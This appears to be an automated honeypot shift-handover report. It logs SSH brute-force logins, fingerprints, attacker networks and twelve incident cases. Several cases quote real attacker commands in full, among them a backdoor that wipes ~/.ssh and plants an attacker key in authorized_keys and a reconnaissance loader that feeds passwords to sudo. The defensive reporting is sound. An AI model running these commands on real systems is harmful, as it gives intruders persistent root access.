# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-19 |
| **Generated At** | 2026-06-19T10:43:46Z |
| **Shift Time** | 10:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **745** |
| Confirmed Threats | **727** |
| False Positives Filtered | **18** (2.4%) |
| Unique Attacker IPs | **69** |
| Countries of Origin | **21** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **733** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **31** |
| Unique Credential Pairs | **23** |
| Unique Usernames | **13** |
| Unique Passwords | **21** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 4 |
| `ubuntu` | 2 |
| `default` | 2 |
| `support` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `admin` | 3 |
| `password` | 2 |
| `root` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `root` | `root` | 2 |
| `root` | `admin` | 2 |
| `support` | `password` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin` | `42.119.156.100` | 2026-06-19T06:29:12 |
| `root` | `admin` | `91.92.40.237` | 2026-06-19T07:30:55 |
| `root` | `abcd@123` | `172.190.24.225` | 2026-06-19T07:32:35 |
| `root` | `password` | `91.92.40.237` | 2026-06-19T07:32:59 |
| `root` | `3245gs5662d34` | `172.190.24.225` | 2026-06-19T07:33:03 |
| `root` | `enter` | `129.121.54.208` | 2026-06-19T09:34:30 |
| `root` | `3245gs5662d34` | `129.121.54.208` | 2026-06-19T09:34:37 |
| `root` | `a123456` | `49.229.157.48` | 2026-06-19T09:43:31 |
| `root` | `Xg123456` | `34.71.30.159` | 2026-06-19T10:24:59 |
| `root` | `3245gs5662d34` | `34.71.30.159` | 2026-06-19T10:25:05 |
| `root` | `QWErty123` | `198.98.62.211` | 2026-06-19T10:35:28 |
| `root` | `3245gs5662d34` | `198.98.62.211` | 2026-06-19T10:35:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **745** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 35 |
| OpenSSH | 6 |
| Go SSH scanner | 5 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 22 | 14 |
| `03a80b21afa8...` | Modern SSH client | 9 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 6 | 6 |
| `2ec37a7cc8da...` | Mirai/variant | 3 | 1 |
| `af8223ac9914...` | libssh-based | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 22 | 14 | Mirai/variant |
| `03a80b21afa8...` | libssh | 9 | 3 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 6 | 6 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 3 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `95420f9d932d...` | Unknown | 2 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 2 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ;
```
```
uname -s -v -n -m 2 > /dev/null
```
```
uname -m 2 > /dev/null
```
```
cat /proc/uptime 2 > /dev/null | cut -d. -f1
```
```
echo 'admin' | sudo -S bash -c 'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo 2>/dev/null; [ "$m" -gt 1048576 ] 2>/dev/null && echo 1 || echo 0' || bash -c 'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo 2>/dev/null; [ "$m" -gt 1048576 ] 2>/dev/null && echo 1 || echo 0'
```
Source IPs: `91.92.40.237`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.190.24.225`, `198.98.62.211`, `129.121.54.208`, `34.71.30.159`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **69** |
| Unique ASNs | **42** |
| High-Risk ASNs | **33** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 7 | HIGH |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS36352` | HostPapa | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-36449cea1b9b

| Field | Detail |
|---|---|
| **Source IP** | `42.119.156[.]100` |
| **First Seen** | 2026-06-19 06:29 |
| **Last Seen** | 2026-06-19 06:30 |
| **Session Duration** | 83s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 06:29:07` | `cowrie.session.connect` |
| `2026-06-19 06:29:07` | `cowrie.client.version` |
| `2026-06-19 06:29:08` | `cowrie.client.kex` |
| `2026-06-19 06:29:11` | `cowrie.login.failed` |
| `2026-06-19 06:29:12` | `cowrie.login.success` |
| `2026-06-19 06:29:12` | `cowrie.session.params` |
| `2026-06-19 06:29:12` | `cowrie.command.input` |
| `2026-06-19 06:29:12` | `cowrie.command.failed` |
| `2026-06-19 06:29:13` | `cowrie.log.closed` |
| `2026-06-19 06:29:13` | `cowrie.session.params` |
| `2026-06-19 06:29:13` | `cowrie.command.input` |
| `2026-06-19 06:29:13` | `cowrie.log.closed` |
| `2026-06-19 06:29:13` | `cowrie.session.params` |
| `2026-06-19 06:29:13` | `cowrie.command.input` |
| `2026-06-19 06:29:13` | `cowrie.log.closed` |
| `2026-06-19 06:29:14` | `cowrie.session.params` |
| `2026-06-19 06:29:14` | `cowrie.command.input` |
| `2026-06-19 06:29:14` | `cowrie.log.closed` |
| `2026-06-19 06:29:14` | `cowrie.session.params` |
| `2026-06-19 06:29:14` | `cowrie.command.input` |
| `2026-06-19 06:29:14` | `cowrie.log.closed` |
| `2026-06-19 06:29:15` | `cowrie.session.params` |
| `2026-06-19 06:29:15` | `cowrie.command.input` |
| `2026-06-19 06:29:15` | `cowrie.log.closed` |
| `2026-06-19 06:29:15` | `cowrie.session.params` |
| `2026-06-19 06:29:15` | `cowrie.command.input` |
| `2026-06-19 06:29:15` | `cowrie.log.closed` |
| `2026-06-19 06:29:15` | `cowrie.session.params` |
| `2026-06-19 06:29:15` | `cowrie.command.input` |
| `2026-06-19 06:29:16` | `cowrie.log.closed` |
| `2026-06-19 06:29:16` | `cowrie.session.params` |
| `2026-06-19 06:29:16` | `cowrie.command.input` |
| `2026-06-19 06:29:16` | `cowrie.log.closed` |
| `2026-06-19 06:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.119.156[.]100` to AbuseIPDB if not already reported
- [ ] Block `42.119.156[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb30dac35f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-06-19 07:30 |
| **Last Seen** | 2026-06-19 07:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1, echo 'admin' | sudo -S bash -c 'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo 2>/dev/null; [ "$m" -gt 1048576 ] 2>/dev/null && echo 1 || echo 0' || bash -c 'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo 2>/dev/null; [ "$m" -gt 1048576 ] 2>/dev/null && echo 1 || echo 0'` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 07:30:53` | `cowrie.session.connect` |
| `2026-06-19 07:30:53` | `cowrie.client.version` |
| `2026-06-19 07:30:53` | `cowrie.client.kex` |
| `2026-06-19 07:30:55` | `cowrie.login.success` |
| `2026-06-19 07:30:55` | `cowrie.session.params` |
| `2026-06-19 07:30:55` | `cowrie.command.input` |
| `2026-06-19 07:30:55` | `cowrie.command.input` |
| `2026-06-19 07:30:55` | `cowrie.command.input` |
| `2026-06-19 07:30:55` | `cowrie.command.input` |
| `2026-06-19 07:30:56` | `cowrie.log.closed` |
| `2026-06-19 07:30:56` | `cowrie.session.params` |
| `2026-06-19 07:30:56` | `cowrie.command.input` |
| `2026-06-19 07:30:56` | `cowrie.command.input` |
| `2026-06-19 07:30:56` | `cowrie.command.failed` |
| `2026-06-19 07:30:56` | `cowrie.command.failed` |
| `2026-06-19 07:30:56` | `cowrie.command.failed` |
| `2026-06-19 07:30:56` | `cowrie.command.failed` |
| `2026-06-19 07:30:57` | `cowrie.log.closed` |
| `2026-06-19 07:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b6ee211871

| Field | Detail |
|---|---|
| **Source IP** | `172.190.24[.]225` |
| **First Seen** | 2026-06-19 07:32 |
| **Last Seen** | 2026-06-19 07:33 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 07:32:33` | `cowrie.session.connect` |
| `2026-06-19 07:32:33` | `cowrie.client.version` |
| `2026-06-19 07:32:34` | `cowrie.client.kex` |
| `2026-06-19 07:32:35` | `cowrie.login.success` |
| `2026-06-19 07:32:38` | `cowrie.session.params` |
| `2026-06-19 07:32:38` | `cowrie.command.input` |
| `2026-06-19 07:32:38` | `cowrie.command.failed` |
| `2026-06-19 07:32:40` | `cowrie.log.closed` |
| `2026-06-19 07:32:40` | `cowrie.session.params` |
| `2026-06-19 07:32:40` | `cowrie.command.input` |
| `2026-06-19 07:32:42` | `cowrie.session.file_download` |
| `2026-06-19 07:32:42` | `cowrie.log.closed` |
| `2026-06-19 07:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.24[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.190.24[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8440e775a5c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-06-19 07:32 |
| **Last Seen** | 2026-06-19 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1, echo 'password' | sudo -S bash -c 'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo 2>/dev/null; [ "$m" -gt 1048576 ] 2>/dev/null && echo 1 || echo 0' || bash -c 'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo 2>/dev/null; [ "$m" -gt 1048576 ] 2>/dev/null && echo 1 || echo 0'` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 07:32:58` | `cowrie.session.connect` |
| `2026-06-19 07:32:58` | `cowrie.client.version` |
| `2026-06-19 07:32:58` | `cowrie.client.kex` |
| `2026-06-19 07:32:59` | `cowrie.login.success` |
| `2026-06-19 07:32:59` | `cowrie.session.params` |
| `2026-06-19 07:32:59` | `cowrie.command.input` |
| `2026-06-19 07:32:59` | `cowrie.command.input` |
| `2026-06-19 07:32:59` | `cowrie.command.input` |
| `2026-06-19 07:32:59` | `cowrie.command.input` |
| `2026-06-19 07:32:59` | `cowrie.log.closed` |
| `2026-06-19 07:32:59` | `cowrie.session.params` |
| `2026-06-19 07:32:59` | `cowrie.command.input` |
| `2026-06-19 07:32:59` | `cowrie.command.input` |
| `2026-06-19 07:32:59` | `cowrie.command.failed` |
| `2026-06-19 07:32:59` | `cowrie.command.failed` |
| `2026-06-19 07:32:59` | `cowrie.command.failed` |
| `2026-06-19 07:32:59` | `cowrie.command.failed` |
| `2026-06-19 07:33:00` | `cowrie.log.closed` |
| `2026-06-19 07:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e0f3ce0ef4

| Field | Detail |
|---|---|
| **Source IP** | `172.190.24[.]225` |
| **First Seen** | 2026-06-19 07:32 |
| **Last Seen** | 2026-06-19 07:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 07:32:58` | `cowrie.session.connect` |
| `2026-06-19 07:32:59` | `cowrie.client.version` |
| `2026-06-19 07:32:59` | `cowrie.client.kex` |
| `2026-06-19 07:33:03` | `cowrie.login.success` |
| `2026-06-19 07:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.24[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.190.24[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14ac05d37da6

| Field | Detail |
|---|---|
| **Source IP** | `129.121.54[.]208` |
| **First Seen** | 2026-06-19 09:34 |
| **Last Seen** | 2026-06-19 09:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 09:34:29` | `cowrie.session.connect` |
| `2026-06-19 09:34:29` | `cowrie.client.version` |
| `2026-06-19 09:34:29` | `cowrie.client.kex` |
| `2026-06-19 09:34:30` | `cowrie.login.success` |
| `2026-06-19 09:34:31` | `cowrie.session.params` |
| `2026-06-19 09:34:31` | `cowrie.command.input` |
| `2026-06-19 09:34:31` | `cowrie.command.failed` |
| `2026-06-19 09:34:31` | `cowrie.log.closed` |
| `2026-06-19 09:34:32` | `cowrie.session.params` |
| `2026-06-19 09:34:32` | `cowrie.command.input` |
| `2026-06-19 09:34:32` | `cowrie.session.file_download` |
| `2026-06-19 09:34:32` | `cowrie.log.closed` |
| `2026-06-19 09:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.54[.]208` to AbuseIPDB if not already reported
- [ ] Block `129.121.54[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e459c139149c

| Field | Detail |
|---|---|
| **Source IP** | `129.121.54[.]208` |
| **First Seen** | 2026-06-19 09:34 |
| **Last Seen** | 2026-06-19 09:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 09:34:36` | `cowrie.session.connect` |
| `2026-06-19 09:34:36` | `cowrie.client.version` |
| `2026-06-19 09:34:36` | `cowrie.client.kex` |
| `2026-06-19 09:34:37` | `cowrie.login.success` |
| `2026-06-19 09:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.54[.]208` to AbuseIPDB if not already reported
- [ ] Block `129.121.54[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bf76a4f39cf

| Field | Detail |
|---|---|
| **Source IP** | `49.229.157[.]48` |
| **First Seen** | 2026-06-19 09:43 |
| **Last Seen** | 2026-06-19 09:43 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 09:43:05` | `cowrie.session.connect` |
| `2026-06-19 09:43:08` | `cowrie.client.version` |
| `2026-06-19 09:43:08` | `cowrie.client.kex` |
| `2026-06-19 09:43:31` | `cowrie.login.success` |
| `2026-06-19 09:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.229.157[.]48` to AbuseIPDB if not already reported
- [ ] Block `49.229.157[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b57c45f3925

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-19 10:24 |
| **Last Seen** | 2026-06-19 10:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 10:24:58` | `cowrie.session.connect` |
| `2026-06-19 10:24:58` | `cowrie.client.version` |
| `2026-06-19 10:24:58` | `cowrie.client.kex` |
| `2026-06-19 10:24:59` | `cowrie.login.success` |
| `2026-06-19 10:25:00` | `cowrie.session.params` |
| `2026-06-19 10:25:00` | `cowrie.command.input` |
| `2026-06-19 10:25:00` | `cowrie.command.failed` |
| `2026-06-19 10:25:00` | `cowrie.log.closed` |
| `2026-06-19 10:25:01` | `cowrie.session.params` |
| `2026-06-19 10:25:01` | `cowrie.command.input` |
| `2026-06-19 10:25:01` | `cowrie.session.file_download` |
| `2026-06-19 10:25:01` | `cowrie.log.closed` |
| `2026-06-19 10:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-955d6b0c1b15

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-19 10:25 |
| **Last Seen** | 2026-06-19 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 10:25:04` | `cowrie.session.connect` |
| `2026-06-19 10:25:04` | `cowrie.client.version` |
| `2026-06-19 10:25:04` | `cowrie.client.kex` |
| `2026-06-19 10:25:05` | `cowrie.login.success` |
| `2026-06-19 10:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff6d635698e3

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-06-19 10:35 |
| **Last Seen** | 2026-06-19 10:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-19 10:35:27` | `cowrie.session.connect` |
| `2026-06-19 10:35:27` | `cowrie.client.version` |
| `2026-06-19 10:35:27` | `cowrie.client.kex` |
